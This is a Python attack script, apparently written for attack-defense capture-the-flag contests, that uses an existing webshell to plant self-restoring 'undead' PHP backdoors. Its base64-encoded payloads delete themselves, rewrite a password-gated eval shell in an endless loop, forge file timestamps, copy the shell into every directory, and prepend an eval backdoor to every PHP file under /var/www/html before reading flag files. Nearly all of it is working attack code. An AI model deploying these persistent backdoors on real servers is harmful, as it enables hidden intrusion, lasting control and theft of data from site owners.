import requests
import HackRequests
import base64

hh = HackRequests.hackRequests()

def one_sh(shellname):
    pay = 'traverdir()(pushd "$1" > /dev/null 2>&1;for file in `ls -1`;do if test -d "$file";then cp $PWD/' + shellname + ' $PWD/$file;echo "$PWD/$file";traverdir "$file" "$((tab + 1  ))";fi;done);traverdir'
    one_payload = base64.b64encode(pay.encode('utf-8')).decode('utf-8')
    return one_payload


def tow_sh(shellname):
    pay = 'cp $PWD/' + shellname + ' /var/www/html/' + shellname
    tow_payload = base64.b64encode(pay.encode('utf-8')).decode('utf-8')
    return tow_payload


def three_sh(one, tow, shname, shname1, shellname):
    pay = '''<?php
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
$file = "''' + shellname + '''";
$code = '<?php if(md5($_GET["pwd"])=="e6d2109ebd5e345a5636fed70e6793b2"){@eval($_POST[a]);echo exec("cat /flag");} ?>';
while (1){
    file_put_contents($file,$code);
    system('touch -m -d "2021-12-01 09:10:12" ''' + shellname + '''');
    system("echo \'''' + one + '''\' | base64 -d > ''' + shname + '''");
    system("echo \'''' + tow + '''\' | base64 -d > ''' + shname1 + '''");
    $asd = system("bash ''' + shname + '''");
    $my = system("bash ''' + shname1 + '''");
    usleep(0);
}'''
    three_payload = base64.b64encode(pay.encode('utf-8')).decode('utf-8')
    return three_payload


def final_pay(shellname):
    one = one_sh(shellname)
    tow = tow_sh(shellname)
    ok_pay = three_sh(one, tow, "1.sh", "2.sh", shellname)
    return ok_pay


def getflag(url, shellname):
    # 用不死马GetFlag

    url3 = url + shellname + "?pwd=douyusec666!"
    #res3 = requests.get(url=url3, timeout=4)
    res3 = requests.post(url3, data={"a": "system('cat /flag.txt');"})
    flag = res3.text
    flag = res3.text[:39]
    return flag


def infected(url, shellname, target, shell, dir):
    shellpath1 = url + dir + shellname + "?pwd=douyusec666!"
    try:
        shell1 = hh.http(shellpath1, post="a=" + shell)
        # 写入木马0
        print(shell1.status_code)  # 200
        url2 = url + dir + target
        url3 = url + shellname
        try:
            res = requests.get(url2, timeout=3)  # 简单请求一下感染不死马
        except Exception as e:
            getshell = requests.get(url3, timeout=3)
            if getshell.status_code == 200:
                print('不死马复活成功！-- ' + getshell.url)
    except Exception as e:
        pass


def includeshell(url, shellname, shell, dir):
    shellpath = url + dir + shellname
    print(shellpath)
    try:
        # include =requests.get(url= shellpath + '?s=' + shell,timeout=5)  #get木马，记得修改密码
        include = hh.http(shellpath, post="admin_ccmd=" + shell)  # post木马，记得修改密码
        includepath = url + dir + ".inc1ude.php"
        include = requests.get(url=includepath, timeout=3)
        if include.status_code == 200:
            print(includepath + ' 不死马包含文件成功，全站php文件皆可当shell连接！')
    except Exception as e:
        print("不死马包含失败" + str(e))
        pass


def all(url):
    shellname0 = "index.php"        #已经被嵌入webshell的文件，将index.php作为webshell载体批量生成不死马，若不存在这个文件得修改
    shellname1 = ".1nclude.php"     #第一个不死马文件的传递感染
    shellname2 = "-1nclude.php"     #第二个不死马文件的传递感染

    pay1 = final_pay(shellname1)
    pay2 = final_pay(shellname2)
    shell_1 = '''system("echo \'''' + pay1 + '''\' | base64 -d > 1.php");'''
    shell_2 = '''system("echo \'''' + pay2 + '''\' | base64 -d > 2.php");'''
    inclu_shell = '''system("echo 'PD9waHAgQHN5c3RlbSgiZmluZCAvdmFyL3d3dy9odG1sLyAtcGF0aCAuIC1wcnVuZSAtbyAgLXR5cGUgZiAtbmFtZSAnKi5waHAnfHhhcmdzICBzZWQgLWkgJzFpPD9waHAgaWYobWQ1KFwkX0dFVFtcInB3ZFwiXSk9PVwiZTZkMjEwOWViZDVlMzQ1YTU2MzZmZWQ3MGU2NzkzYjJcIil7QGV2YWwoXCRfUE9TVFthXSk7fSA/PiciKTsgPz4=' | base64 -d > .inc1ude.php");'''

    # bugku专用
    includeshell(url, "shell.php", inclu_shell, "include/") #第二个参数是已存在的webshell，第四个参数是webshell存在的目录
    infected(url, shellname0, "1.php", shell_1, "")
    infected(url, shellname1, "2.php", shell_2, "")

    flag = getflag(url, "/.1nclude.php")
    print(flag)


if __name__ == '__main__':
    all("")
